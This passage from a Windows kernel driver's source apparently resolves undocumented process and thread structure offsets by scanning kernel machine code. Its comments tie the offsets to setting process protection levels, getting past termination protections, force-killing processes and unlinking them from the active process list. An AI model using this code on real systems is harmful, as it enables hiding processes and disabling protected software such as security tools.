        g_ProtectionOffset = 0;
        DbgPrint("[tzd] Protection offset 解析失败/越界 raw=0x%X — SET_PPL 将被拒绝\n", off);
    }

    // 记录 Windows 构建号, 便于跨版本排查 (DbgView 或 调试器可见)
    ULONG major = 0, minor = 0, build = 0;
    PsGetVersion(&major, &minor, &build, NULL);
    DbgPrint("[tzd] Windows %lu.%lu build %lu\n", major, minor, build);

    // ★ 动态解析 EPROCESS.UniqueProcessId 偏移 (从 PsGetProcessId 机器码)
    //   PsGetProcessId: mov rax,[rcx+disp32]; ret  → 48 8B 81 xx xx xx xx C3
    //   ActiveProcessLinks = UniqueProcessId + 8 (结构体固定布局: PID 是 void* 8字节, 紧接 LIST_ENTRY)
    {
        UNICODE_STRING un;
        RtlInitUnicodeString(&un, L"PsGetProcessId");
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&un);
        if (fn)
        {
            __try
            {
                // 扫描前 16 字节找 mov rax,[rcx+disp32]; ret (48 8B 81 ?? C3 或 REX 变体)
                for (int i = 0; i < 12; i++)
                {
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8B && fn[i + 2] == 0x81 &&
                        fn[i + 7] == 0xC3)
                    {
                        g_UniquePidOffset = *(ULONG *)(fn + i + 3);
                        break;
                    }
                    // 通用扫描: 8B 81 <disp32> ... C3 (mov eax,[rcx+disp32] 或 mov rax 带前缀)
                    if (fn[i] == 0x8B && fn[i + 1] == 0x81)
                    {
                        ULONG raw = *(ULONG *)(fn + i + 2);
                        // 找 ret 在 i+6 或 i+7
                        if (fn[i + 6] == 0xC3 || (i < 14 && fn[i + 7] == 0xC3))
                        {
                            g_UniquePidOffset = raw;
                            break;
                        }
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }
            if (g_UniquePidOffset >= 0x100 && g_UniquePidOffset < 0x2000)
            {
                g_ActiveLinksOffset = g_UniquePidOffset + 8;
                DbgPrint("[tzd] UniquePid=+0x%X ActiveLinks=+0x%X (从 PsGetProcessId 解析)\n",
                         g_UniquePidOffset, g_ActiveLinksOffset);
            }
            else
                DbgPrint("[tzd] UniquePid offset 解析失败 raw=0x%X\n", g_UniquePidOffset);
        }
    }

    // ★ 动态解析 EPROCESS.ExitStatus 偏移 (从 PsGetProcessExitStatus 机器码)
    //   PsGetProcessExitStatus: mov eax,[rcx+disp32]; ret  → 8B 81 xx xx xx xx C3
    {
        UNICODE_STRING un;
        RtlInitUnicodeString(&un, L"PsGetProcessExitStatus");
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&un);
        if (fn)
        {
            __try
            {
                for (int i = 0; i < 12; i++)
                {
                    if (fn[i] == 0x8B && fn[i + 1] == 0x81 &&
                        (fn[i + 6] == 0xC3 || (i < 14 && fn[i + 7] == 0xC3)))
                    {
                        g_ExitStatusOffset = *(ULONG *)(fn + i + 2);
                        break;
                    }
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8B && fn[i + 2] == 0x81 &&
                        (fn[i + 7] == 0xC3 || (i < 13 && fn[i + 8] == 0xC3)))
                    {
                        g_ExitStatusOffset = *(ULONG *)(fn + i + 3);
                        break;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }
            if (g_ExitStatusOffset >= 0x100 && g_ExitStatusOffset < 0x2000)
                DbgPrint("[tzd] ExitStatus=+0x%X (从 PsGetProcessExitStatus 解析)\n", g_ExitStatusOffset);
            else
                DbgPrint("[tzd] ExitStatus offset 解析失败 raw=0x%X\n", g_ExitStatusOffset);
        }
    }

    // ★ 动态解析 PspActiveProcessLock 地址 (从 PsGetNextProcess 机器码)
    //   PsGetNextProcess 引用 PspActiveProcessLock: lea rcx,[rip+disp32] → 48 8D 0D xx xx xx xx
    //   后面紧跟 call ExAcquirePushLockExclusiveEx → 扫描这个模式
    {
        UNICODE_STRING un;
        RtlInitUnicodeString(&un, L"PsGetNextProcess");
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&un);
        if (fn)
        {
            __try
            {
                for (int i = 0; i < 128; i++)
                {
                    // lea rcx, [rip+disp32]: 48 8D 0D <disp32>
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8D && fn[i + 2] == 0x0D)
                    {
                        // 计算 lea 目标地址 = &fn[i] + 7 + disp32
                        LONG disp = *(LONG *)(fn + i + 3);
                        PVOID target = (PUCHAR)&fn[i] + 7 + disp;
                        // 检查后续是否调用 ExAcquirePushLockExclusiveEx 或直接操作 lock
                        // 如果目标地址处的内容看起来像 EX_PUSH_LOCK (非零, 且在内核空间)
                        if ((ULONG_PTR)target >= 0xFFFFF80000000000ULL &&
                            (ULONG_PTR)target < 0xFFFFFFFFFFFFFFFFULL)
                        {
                            g_PspActiveProcessLock = target;
                            DbgPrint("[tzd] PspActiveProcessLock=%p (从 PsGetNextProcess offset %d 解析)\n",
                                     target, i);
                            break;
                        }
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }
            if (!g_PspActiveProcessLock)
                DbgPrint("[tzd] PspActiveProcessLock 解析失败\n");
        }
    }

    // 解析 NT 内存 API (扫描直接 syscall 用)
    UNICODE_STRING n1, n2;
    RtlInitUnicodeString(&n1, L"ZwQueryVirtualMemory");
    RtlInitUnicodeString(&n2, L"ZwProtectVirtualMemory");
    g_ZwQueryVirtualMemory = (PFN_ZwQueryVirtualMemory)MmGetSystemRoutineAddress(&n1);
    g_ZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)MmGetSystemRoutineAddress(&n2);
    DbgPrint("[tzd] ZwQueryVirtualMemory=%p ZwProtectVirtualMemory=%p\n",
             g_ZwQueryVirtualMemory, g_ZwProtectVirtualMemory);

    // 探测 KeSetSystemServiceCallback (per-syscall trace 注册 API)。非导出 → 环境不允许官方注册。
    UNICODE_STRING n3;
    RtlInitUnicodeString(&n3, L"KeSetSystemServiceCallback");
    g_KeSetSystemServiceCallback = MmGetSystemRoutineAddress(&n3);
    DbgPrint("[tzd] KeSetSystemServiceCallback=%p (%s)\n", g_KeSetSystemServiceCallback,
             g_KeSetSystemServiceCallback ? "环境允许官方 syscall-trace 注册" : "未导出 → 环境不允许");

    // ★ 动态解析 ZwTerminateThread (ntoskrnl.lib 未导出, 但内核导出表有)
    //   force-kill 遍历线程列表终止每个线程用; 解析失败则跳过线程终止 (进程摘链仍有效)
    {
        UNICODE_STRING n4;
        RtlInitUnicodeString(&n4, L"ZwTerminateThread");
        g_ZwTerminateThread = (PFN_ZwTerminateThread)MmGetSystemRoutineAddress(&n4);
        DbgPrint("[tzd] ZwTerminateThread=%p (%s)\n", g_ZwTerminateThread,
                 g_ZwTerminateThread ? "resolved" : "NOT found → force-kill skips thread term");
    }

    // ★ 动态解析 EPROCESS.Flags 偏移 (从 PsGetProcessExitProcessCalled 机器码)
    //   PsGetProcessExitProcessCalled: mov eax, [rcx+disp32]; ret → 8B 81 <disp32> C3
    //   Flags bit3 = ProcessTerminating (PspTerminateProcess: or r10d, 8 → lock cmpxchg [rcx+Flags])
    {
        UNICODE_STRING un;
        RtlInitUnicodeString(&un, L"PsGetProcessExitProcessCalled");
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&un);
        if (fn)
        {
            __try
            {
                for (int i = 0; i < 12; i++)
                {
                    if (fn[i] == 0x8B && fn[i + 1] == 0x81 &&
                        (fn[i + 6] == 0xC3 || (i < 14 && fn[i + 7] == 0xC3)))
                    {
                        g_FlagsOffset = *(ULONG *)(fn + i + 2);
                        break;
                    }
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8B && fn[i + 2] == 0x81 &&
                        (fn[i + 7] == 0xC3 || (i < 13 && fn[i + 8] == 0xC3)))
                    {
                        g_FlagsOffset = *(ULONG *)(fn + i + 3);
                        break;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }
            if (g_FlagsOffset >= 0x100 && g_FlagsOffset < 0x2000)
                DbgPrint("[tzd] Flags=+0x%X (从 PsGetProcessExitProcessCalled 解析)\n", g_FlagsOffset);
            else
                DbgPrint("[tzd] Flags offset 解析失败 raw=0x%X\n", g_FlagsOffset);
        }
    }

    // ★ 动态解析 ThreadListHead / ProcessLock / ThreadListEntry (从 PsGetNextProcessThread 机器码)
    //   PsGetNextProcessThread 用 lea reg,[rcx+disp32] 访问 ProcessLock(0x438) 和
    //   ThreadListHead(0x5E0); 用 lea reg,[reg-neg_disp32] 做 CONTAINING_RECORD(0x538)
    //
    //   PsGetNextProcessThread 是导出函数; 但 ntoskrnl.lib 可能不链接 → 用 MmGetSystemRoutineAddress
    {
        UNICODE_STRING un;
        RtlInitUnicodeString(&un, L"PsGetNextProcessThread");
        PUCHAR fn = (PUCHAR)MmGetSystemRoutineAddress(&un);
        if (fn)
        {
            __try
            {
                for (int i = 0; i < 128; i++)
                {
                    // lea reg, [rcx+disp32]: 48 8D <modrm> <disp32> where (modrm & 0xC7) == 0x81
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8D && (fn[i + 2] & 0xC7) == 0x81)
                    {
                        ULONG off = *(ULONG *)(fn + i + 3);
                        if (off >= 0x100 && off < 0x2000)
                        {
                            // 两个 LEA: 较小=ProcessLock, 较大=ThreadListHead
                            if (off > g_ThreadListHeadOffset)
                                g_ThreadListHeadOffset = off;
                        }
                    }
                    // lea reg, [reg-neg_disp32]: CONTAINING_RECORD
                    // 48/49/4C/4D 8D <modrm> <disp32> where mod=10 (modrm & 0xC0)==0x80
                    if ((fn[i] == 0x48 || fn[i] == 0x49 || fn[i] == 0x4C || fn[i] == 0x4D) &&
                        fn[i + 1] == 0x8D && (fn[i + 2] & 0xC0) == 0x80)
                    {
                        // 只处理 r/m != 001 (rcx) 的 (rcx 的 lea 已在上方处理)
                        if ((fn[i + 2] & 0x07) != 0x01)
                        {
                            LONG disp = *(LONG *)(fn + i + 3);
                            if (disp < 0 && -disp >= 0x100 && -disp <= 0x1000)
                            {
                                g_ThreadListEntryOffset = (ULONG)(-disp);
                            }
                        }
                        else
                        {
                            // lea reg, [rcx+disp32] where disp32 可能为负
                            LONG disp = *(LONG *)(fn + i + 3);
                            if (disp < 0 && -disp >= 0x100 && -disp <= 0x1000)
                            {
                                g_ThreadListEntryOffset = (ULONG)(-disp);
                            }
                        }
                    }
                    // mov reg, [reg+disp32]: 读取 ThreadListEntry.Flink (如 mov r14, [r15+538h])
                    // 48/4C/4D 8B <modrm> <disp32> where mod=10
                    if ((fn[i] == 0x48 || fn[i] == 0x4C || fn[i] == 0x4D) &&
                        fn[i + 1] == 0x8B && (fn[i + 2] & 0xC0) == 0x80)
                    {
                        LONG disp = *(LONG *)(fn + i + 3);
                        if (disp >= 0x100 && disp <= 0x1000)
                        {
                            // 这可能是 ThreadListEntry 偏移 (mov reg, [thread+ThreadListEntry])
                            if (g_ThreadListEntryOffset == 0)
                                g_ThreadListEntryOffset = (ULONG)disp;
                        }
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }
            // ProcessLock = 较小的 lea [rcx+disp32] (ThreadListHead - ProcessLock 的差值通常 > 0x100)
            if (g_ThreadListHeadOffset > 0)
            {
                // 重新扫描找 ProcessLock (较小的 [rcx+disp32])
                for (int i = 0; i < 128; i++)
                {
                    if (fn[i] == 0x48 && fn[i + 1] == 0x8D && (fn[i + 2] & 0xC7) == 0x81)
                    {
                        ULONG off = *(ULONG *)(fn + i + 3);
                        if (off >= 0x100 && off < g_ThreadListHeadOffset)
                        {
                            g_ProcessLockOffset = off;
                            break;
                        }
                    }
                }
            }
            DbgPrint("[tzd] ThreadListHead=+0x%X ThreadListEntry=+0x%X ProcessLock=+0x%X (从 PsGetNextProcessThread 解析)\n",
                     g_ThreadListHeadOffset, g_ThreadListEntryOffset, g_ProcessLockOffset);
        }
        else
        {
            DbgPrint("[tzd] PsGetNextProcessThread 未找到 → force-kill 线程遍历将不可用\n");
        }
    }

    // ★ 动态解析 kill 保护标志偏移 (IDA 反编译确认的三层保护)
    //   层1: EPROCESS.ProcessFlags (+0x460) bit10 (0x400)
    //        PspTerminateProcess: test [rbx+460h], 400h; jnz skip_PspTerminateAllThreads
    //   层2: EPROCESS.CommitRelinquished (+0x87C) bit0 (0x1)
    //        PspTerminateThreadByPointer: test [rdi+87Ch], 1; jnz → STATUS_SPECIAL_ACCOUNT
    //   层3: ETHREAD.CrossThreadFlags (+0x74) bit10 (0x400)
    //        PspTerminateThreadByPointer: test [rbx+74h], 400h; jnz → STATUS_ACCESS_DENIED
    {
        // 层1: 从 PsIsProcessPrimaryTokenFrozen 解析 (mov eax,[rcx+disp32]; ret)
        UNICODE_STRING un1;
        RtlInitUnicodeString(&un1, L"PsIsProcessPrimaryTokenFrozen");
        PUCHAR fn1 = (PUCHAR)MmGetSystemRoutineAddress(&un1);
        if (fn1)
        {
            __try
            {
                for (int i = 0; i < 12; i++)
                {
                    if (fn1[i] == 0x8B && fn1[i + 1] == 0x81 &&
                        (fn1[i + 6] == 0xC3 || (i < 14 && fn1[i + 7] == 0xC3)))
                    {
                        g_ProcessFlags2Offset = *(ULONG *)(fn1 + i + 2);
                        break;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
            if (g_ProcessFlags2Offset >= 0x100 && g_ProcessFlags2Offset < 0x2000)
                DbgPrint("[tzd] ProcessFlags2=+0x%X (kill保护层1)\n", g_ProcessFlags2Offset);
        }
        // 层2: 从 PsIsProcessCommitRelinquished 解析
        UNICODE_STRING un2;
        RtlInitUnicodeString(&un2, L"PsIsProcessCommitRelinquished");
        PUCHAR fn2 = (PUCHAR)MmGetSystemRoutineAddress(&un2);
        if (fn2)
        {
            __try
            {
                for (int i = 0; i < 12; i++)
                {
                    if (fn2[i] == 0x8B && fn2[i + 1] == 0x81 &&
                        (fn2[i + 6] == 0xC3 || (i < 14 && fn2[i + 7] == 0xC3)))
                    {
                        g_CommitRelinquishedOffset = *(ULONG *)(fn2 + i + 2);
                        break;
                    }
                    if (fn2[i] == 0x0F && fn2[i + 1] == 0xB6 && fn2[i + 2] == 0x81 &&
                        (fn2[i + 7] == 0xC3 || (i < 14 && fn2[i + 8] == 0xC3)))
                    {
                        g_CommitRelinquishedOffset = *(ULONG *)(fn2 + i + 3);
                        break;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
            if (g_CommitRelinquishedOffset >= 0x100 && g_CommitRelinquishedOffset < 0x2000)
                DbgPrint("[tzd] CommitRelinquished=+0x%X (kill保护层2)\n", g_CommitRelinquishedOffset);
        }
        // 层3: 多级 call 跟踪 NtTerminateProcess → PspTerminateProcess → AllThreads → TermByPtr
        //   在 PspTerminateThreadByPointer 中扫 test [reg+disp], 0x400
        UNICODE_STRING un3;
        RtlInitUnicodeString(&un3, L"NtTerminateProcess");
        PUCHAR ntTerm = (PUCHAR)MmGetSystemRoutineAddress(&un3);
        if (ntTerm)
        {
            __try
            {
                PUCHAR pspTerm = NULL, allThreads = NULL, termByPtr = NULL;
                // L1: 找 PspTerminateProcess (特征: 前128字节内含 prefetchw [rcx+disp32] = 0F 0D <modrm 0x81>)
                //   注意: 函数有 prologue (mov rax,rsp 等), prefetchw 在偏移 0x2C 处 → 必须扫描前128字节
                for (int i = 0; i < 512 && !pspTerm; i++)
                {
                    if (ntTerm[i] != 0xE8) continue;
                    LONG rel = *(LONG *)(ntTerm + i + 1);
                    PUCHAR tgt = ntTerm + i + 5 + rel;
                    for (int j = 0; j < 128; j++)
                    {
                        if (tgt[j] == 0x0F && tgt[j + 1] == 0x0D && (tgt[j + 2] & 0xC7) == 0x81)
                        {
                            pspTerm = tgt;
                            if (g_FlagsOffset == 0)
                                g_FlagsOffset = *(ULONG *)(tgt + j + 3);
                            break;
                        }
                    }
                }
                DbgPrint("[tzd] PspTerminateProcess=%p Flags=+0x%X\n", pspTerm, g_FlagsOffset);

                // 在 PspTerminateProcess 中找层1: test [reg+disp], 0x400 → ProcessFlags2 offset
                if (pspTerm)
                {
                    for (int i = 0; i < 256 && g_ProcessFlags2Offset == 0; i++)
                    {
                        if (pspTerm[i] != 0xF7) continue;
                        UCHAR modrm = pspTerm[i + 1];
                        if ((modrm & 0xC0) == 0x40 && *(ULONG *)(pspTerm + i + 3) == 0x400)
                            g_ProcessFlags2Offset = pspTerm[i + 2];
                        else if ((modrm & 0xC0) == 0x80 && *(ULONG *)(pspTerm + i + 2 + 4) == 0x400)
                            g_ProcessFlags2Offset = *(ULONG *)(pspTerm + i + 2);
                    }
                    DbgPrint("[tzd] ProcessFlags2=+0x%X (层1)\n", g_ProcessFlags2Offset);
                }

                // L2: 找 PspTerminateAllThreads (特征: 前128字节内含 test [rcx+Flags], 0x2000)
                if (pspTerm)
                {
                    for (int i = 0; i < 512 && !allThreads; i++)
                    {
                        if (pspTerm[i] != 0xE8) continue;
                        LONG rel = *(LONG *)(pspTerm + i + 1);
                        PUCHAR tgt = pspTerm + i + 5 + rel;
                        for (int j = 0; j < 128; j++)
                        {
                            if (tgt[j] == 0xF7 && tgt[j + 1] == 0x81)
                            {
                                ULONG off = *(ULONG *)(tgt + j + 2);
                                if (off == g_FlagsOffset && *(ULONG *)(tgt + j + 6) == 0x2000)
                                {
                                    allThreads = tgt;
                                    break;
                                }
                            }
                        }
                    }
                }
                DbgPrint("[tzd] PspTerminateAllThreads=%p\n", allThreads);
                // L3: 找 PspTerminateThreadByPointer (特征: 前128字节内含 mov eax,[rcx+560h] = 8B 81 60 05 00 00)
                if (allThreads)
                {
                    for (int i = 0; i < 512 && !termByPtr; i++)
                    {
                        if (allThreads[i] != 0xE8) continue;
                        LONG rel = *(LONG *)(allThreads + i + 1);
                        PUCHAR tgt = allThreads + i + 5 + rel;
                        for (int j = 0; j < 128; j++)
                        {
                            if (tgt[j] == 0x8B && tgt[j + 1] == 0x81 &&
                                *(ULONG *)(tgt + j + 2) == 0x560)
                            {
                                termByPtr = tgt;
                                break;
                            }
                        }
                    }
                }
                DbgPrint("[tzd] PspTerminateThreadByPointer=%p\n", termByPtr);
                // L4: 在 PspTerminateThreadByPointer 中扫前128字节:
                //   层3: test [reg+disp], 0x400 → ThreadCrossFlags offset
                //   层2: mov eax, [rdi+disp32] (8B 87 <disp32>) → CommitRelinquished offset
                //   注: test [rbx+74h], 0x400 在偏移 0x54 处 → 必须 >=128 字节范围
                if (termByPtr)
                {
                    for (int i = 0; i < 128; i++)
                    {
                        // 层3: test [reg+disp], 0x400
                        if (g_ThreadCrossFlagsOffset == 0 && termByPtr[i] == 0xF7)
                        {
                            UCHAR modrm = termByPtr[i + 1];
                            if ((modrm & 0xC0) == 0x40 && // mod=01 disp8
                                *(ULONG *)(termByPtr + i + 3) == 0x400)
                                g_ThreadCrossFlagsOffset = termByPtr[i + 2];
                            else if ((modrm & 0xC0) == 0x80 && // mod=10 disp32
                                     *(ULONG *)(termByPtr + i + 2 + 4) == 0x400)
                                g_ThreadCrossFlagsOffset = *(ULONG *)(termByPtr + i + 2);
                        }
                        // 层2: mov eax, [rdi+disp32] = 8B 87 <disp32>
                        //   (rdi = ETHREAD+0x220 = EPROCESS*, 访问 CommitRelinquished)
                        if (g_CommitRelinquishedOffset == 0 && termByPtr[i] == 0x8B &&
                            termByPtr[i + 1] == 0x87)
                        {
                            ULONG off = *(ULONG *)(termByPtr + i + 2);
                            if (off >= 0x100 && off < 0x2000)
                                g_CommitRelinquishedOffset = off;
                        }
                    }
                    DbgPrint("[tzd] ThreadCrossFlags=+0x%X (层3) CommitRelinquished=+0x%X (层2)\n",
                             g_ThreadCrossFlagsOffset, g_CommitRelinquishedOffset);
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }

        // ★ 备选: 直接从 NtTerminateProcess 自身扫描 CommitRelinquished 偏移
        //   NtTerminateProcess NULL-handle 路径有: mov eax, [rbp+disp32] (8B 85 <disp32>)
        //   其中 disp32 >= 0x800 的是 CommitRelinquished (0x87C), < 0x800 的是 Flags (0x464)
        if (g_CommitRelinquishedOffset == 0 && ntTerm)
        {
            __try
            {
                for (int i = 0; i < 512 && g_CommitRelinquishedOffset == 0; i++)
                {
                    // mov eax, [rbp+disp32] = 8B 85 <disp32>
                    if (ntTerm[i] == 0x8B && ntTerm[i + 1] == 0x85)
                    {
                        ULONG off = *(ULONG *)(ntTerm + i + 2);
                        if (off >= 0x800 && off < 0x2000)
                            g_CommitRelinquishedOffset = off;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
            if (g_CommitRelinquishedOffset)
                DbgPrint("[tzd] CommitRelinquished=+0x%X (从 NtTerminateProcess 直接扫描)\n", g_CommitRelinquishedOffset);
        }

        // ★ 备选: 从 NtTerminateProcess 扫描 ActiveProcessLinks 偏移
        //   handle 路径有: mov eax, [rdi+440h] (PID) → UniqueProcessId
        //   也扫 PsGetNextProcess 的 CONTAINING_RECORD: lea r15, [r14-448h] → ActiveProcessLinks
        if (g_UniquePidOffset == 0)
        {
            __try
            {
                for (int i = 0; i < 512 && g_UniquePidOffset == 0; i++)
                {
                    // mov eax, [rdi+disp32] = 8B 87 <disp32> (rdi = target EPROCESS)
                    if (ntTerm[i] == 0x8B && ntTerm[i + 1] == 0x87)
                    {
                        ULONG off = *(ULONG *)(ntTerm + i + 2);
                        if (off >= 0x100 && off < 0x800)
                            g_UniquePidOffset = off;
                    }
                }
                if (g_UniquePidOffset >= 0x100 && g_UniquePidOffset < 0x2000)
                    g_ActiveLinksOffset = g_UniquePidOffset + 8;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
            if (g_UniquePidOffset)
                DbgPrint("[tzd] UniquePid=+0x%X ActiveLinks=+0x%X (从 NtTerminateProcess 扫描)\n",
                         g_UniquePidOffset, g_ActiveLinksOffset);
        }

        // ★ 备选: 从 NtTerminateProcess NULL-handle 路径找 ProcessLock 偏移
        //   lea rdi, [rbp+disp32] = 48 8D BD <disp32> (or 48 8D 8D for [rbp+disp32])
        if (g_ProcessLockOffset == 0)
        {
            __try
            {
                for (int i = 0; i < 512 && g_ProcessLockOffset == 0; i++)
                {
                    // lea rdi, [rbp+disp32] = 48 8D BD <disp32>
                    if (ntTerm[i] == 0x48 && ntTerm[i + 1] == 0x8D &&
                        (ntTerm[i + 2] & 0xC7) == 0x85) // mod=10, r/m=101 (rbp)
                    {
                        ULONG off = *(ULONG *)(ntTerm + i + 3);
                        if (off >= 0x100 && off < 0x800)
                            g_ProcessLockOffset = off;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }

        // 最终总结
        DbgPrint("[tzd] === kill-protection offsets FINAL (pre-textscan): Flags=+0x%X PF2=+0x%X CR=+0x%X TCF=+0x%X PLock=+0x%X Links=+0x%X ===\n",
                 g_FlagsOffset, g_ProcessFlags2Offset, g_CommitRelinquishedOffset,
                 g_ThreadCrossFlagsOffset, g_ProcessLockOffset, g_ActiveLinksOffset);
    }

    // ★★★ 最终兜底: 扫描 ntoskrnl .text 节找字节模式 (不依赖函数名导出) ★★★
    //   上面所有方法都依赖 MmGetSystemRoutineAddress 找特定函数名, 但很多 Psp* 函数
    //   未导出 → 全部返回 NULL. 此方法直接扫描 .text 节找 IDA 确认的精确字节模式.
    if (g_ProcessFlags2Offset == 0 || g_CommitRelinquishedOffset == 0 ||
        g_FlagsOffset == 0 || g_ThreadCrossFlagsOffset == 0)
    {
        ULONG64 kbase = tzd_systrace_resolve_base();
        if (kbase)
        {
            __try
            {
                // PE 头解析: 找最大的可执行节 (不是第一个 — .init 可能比 .text 先)
                ULONG peOff = *(ULONG *)(kbase + 0x3C);
                PUCHAR pe = (PUCHAR)kbase + peOff;
                USHORT nSections = *(USHORT *)(pe + 6);
                ULONG optHdrSize = *(USHORT *)(pe + 0x14);
                PUCHAR secHdr = pe + 0x18 + optHdrSize;
                PUCHAR textVA = NULL;
                SIZE_T textSize = 0;
                SIZE_T bestSize = 0;
                for (ULONG i = 0; i < nSections; i++)
                {
                    ULONG chars = *(ULONG *)(secHdr + i * 40 + 36);
                    if (chars & 0x20000000) // IMAGE_SCN_MEM_EXECUTE
                    {
                        ULONG vsize = *(ULONG *)(secHdr + i * 40 + 8);
                        ULONG rsize = *(ULONG *)(secHdr + i * 40 + 16);
                        ULONG sz = vsize > rsize ? vsize : rsize; // 取较大值
                        if (sz > bestSize) // 选最大的可执行节 (.text 通常最大)
                        {
                            bestSize = sz;
                            textVA = (PUCHAR)kbase + *(ULONG *)(secHdr + i * 40 + 12);
                            textSize = sz;
                        }
                    }
                }
                // 兜底: 如果找到的节太小 (< 1MB), 扫描固定 16MB 范围
                if (textVA && textSize < 0x100000)
                {
                    DbgPrint("[tzd] .text section too small (0x%llx), extending to 16MB\n", (ULONG64)textSize);
                    textSize = 0x1000000; // 16MB
                }
                if (textVA && textSize > 100)
                {
                    DbgPrint("[tzd] scanning .text @%p size=0x%llx for kill-protection patterns\n", textVA, (ULONG64)textSize);
                    for (SIZE_T i = 0; i + 10 <= textSize; i++)
                    {
                        // 层1 ProcessFlags2: test [rbx+disp32], 0x400 = F7 83 <disp32> 00 04 00 00
                        if (g_ProcessFlags2Offset == 0 &&
                            textVA[i] == 0xF7 && textVA[i+1] == 0x83 &&
                            *(ULONG*)(textVA + i + 6) == 0x400)
                        {
                            ULONG off = *(ULONG*)(textVA + i + 2);
                            if (off >= 0x100 && off < 0x800)
                                g_ProcessFlags2Offset = off;
                        }
                        // 层2 CommitRelinquished: mov eax,[rdi+disp32] = 8B 87 <disp32> A8 01 75
                        //   约束: disp32 > ExitStatus 且后跟 jnz(75) — PspTerminateThreadByPointer 独有
                        if (g_CommitRelinquishedOffset == 0 && g_ExitStatusOffset != 0 &&
                            textVA[i] == 0x8B && textVA[i+1] == 0x87 &&
                            textVA[i+6] == 0xA8 && textVA[i+7] == 0x01 &&
                            textVA[i+8] == 0x75) // jnz after test al,1
                        {
                            ULONG off = *(ULONG*)(textVA + i + 2);
                            if (off > g_ExitStatusOffset && off < 0x2000)
                                g_CommitRelinquishedOffset = off;
                        }
                        // Flags: lock cmpxchg [rcx+disp32], r10d = F0 44 0F B1 91 <disp32>
                        //   精确化: 前一条必须是 or r10d, 8 (41 83 CA 08) — PspTerminateProcess 独有
                        if (g_FlagsOffset == 0 && i >= 4 &&
                            textVA[i-4] == 0x41 && textVA[i-3] == 0x83 &&
                            textVA[i-2] == 0xCA && textVA[i-1] == 0x08 && // or r10d, 8
                            textVA[i] == 0xF0 && textVA[i+1] == 0x44 &&
                            textVA[i+2] == 0x0F && textVA[i+3] == 0xB1 &&
                            (textVA[i+4] & 0xC7) == 0x81) // mod=10, r/m=rcx
                        {
                            ULONG off = *(ULONG*)(textVA + i + 5);
                            if (off >= 0x100 && off < 0x2000)
                                g_FlagsOffset = off;
                        }
                        // 层3 ThreadCrossFlags: test [rbx+disp8], 0x400 = F7 43 <disp8> 00 04 00 00
                        if (g_ThreadCrossFlagsOffset == 0 &&
                            textVA[i] == 0xF7 && textVA[i+1] == 0x43 &&
                            *(ULONG*)(textVA + i + 3) == 0x400)
                        {
                            UCHAR off = textVA[i+2];
                            if (off >= 0x40 && off < 0x200)
                                g_ThreadCrossFlagsOffset = off;
                        }
                        // ThreadListHead: lea reg,[rcx+disp32] = 48 8D <modrm 0x81> <disp32>
                        //   disp32 in [0x500, 0x700] (IDA: 0x5E0)
                        if (g_ThreadListHeadOffset == 0 &&
                            textVA[i] == 0x48 && textVA[i+1] == 0x8D &&
                            (textVA[i+2] & 0xC7) == 0x81) // mod=10, r/m=rcx
                        {
                            ULONG off = *(ULONG*)(textVA + i + 3);
                            if (off >= 0x500 && off < 0x700)
                                g_ThreadListHeadOffset = off;
                        }
                        // ThreadListEntry: lea reg,[reg-neg_disp32] (CONTAINING_RECORD)
                        //   4x 8D <modrm mod=10> <neg_disp32>, |disp32| in [0x100, 0x1000]
                        if (g_ThreadListEntryOffset == 0 &&
                            (textVA[i] & 0xF0) == 0x40 && // REX prefix
                            textVA[i+1] == 0x8D &&
                            (textVA[i+2] & 0xC0) == 0x80) // mod=10 (disp32)
                        {
                            LONG disp = *(LONG*)(textVA + i + 3);
                            if (disp < 0 && -disp >= 0x100 && -disp <= 0x1000)
                                g_ThreadListEntryOffset = (ULONG)(-disp);
                        }
                    }
                    DbgPrint("[tzd] .text scan done: PF2=+0x%X CR=+0x%X Flags=+0x%X TCF=+0x%X TLH=+0x%X TLE=+0x%X\n",
                             g_ProcessFlags2Offset, g_CommitRelinquishedOffset,
                             g_FlagsOffset, g_ThreadCrossFlagsOffset,
                             g_ThreadListHeadOffset, g_ThreadListEntryOffset);

                    // 兜底: Flags = ProcessFlags2 + 4 (两个相邻 ULONG 字段, 固定关系)
                    if (g_FlagsOffset == 0 && g_ProcessFlags2Offset != 0)
                    {
                        g_FlagsOffset = g_ProcessFlags2Offset + 4;
                        DbgPrint("[tzd] Flags=+0x%X (fallback: PF2+4)\n", g_FlagsOffset);
                    }
                    // 兜底: CommitRelinquished = Protection + 2
                    //   IDA: Protection@0x87A, CommitRelinquished@0x87C (=Protection+2)
                    //   这两个字段在 EPROCESS "保护区域" 内相邻
                    if (g_CommitRelinquishedOffset == 0 && g_ProtectionOffset != 0)
                    {
                        g_CommitRelinquishedOffset = g_ProtectionOffset + 2;
                        DbgPrint("[tzd] CommitRelinquished=+0x%X (fallback: Protection+2)\n", g_CommitRelinquishedOffset);
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DbgPrint("[tzd] .text scan exception %lx\n", GetExceptionCode());
            }
        }

        // ★ 兜底: 也试 NtTerminateThread (Zw* 可能未导出, Nt* 可能导出)
        if (!g_ZwTerminateThread)
        {
            UNICODE_STRING n5;
            RtlInitUnicodeString(&n5, L"NtTerminateThread");
